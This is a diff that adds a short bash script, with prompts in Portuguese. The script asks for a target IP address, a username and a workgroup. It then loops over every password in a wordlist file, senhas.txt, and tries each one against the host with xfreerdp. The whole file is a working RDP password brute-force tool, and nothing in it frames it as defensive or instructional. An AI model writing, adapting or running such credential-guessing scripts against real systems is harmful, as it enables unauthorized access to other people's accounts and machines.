@@ -1,0 +1,16 @@
+#!/bin/bash
+
+echo "[+] Insira o endereço IP:"
+read ipp
+
+echo "[+] Insira o usuário a ser testado:"
+read usuario
+
+echo "[+] Insira o Workgroup"
+read workg
+
+for pass in $(cat senhas.txt);
+do
+echo "Testando senha: $pass"
+xfreerdp /u:$usuario /p:$pass /d:$workg /v:$ipp;
+done
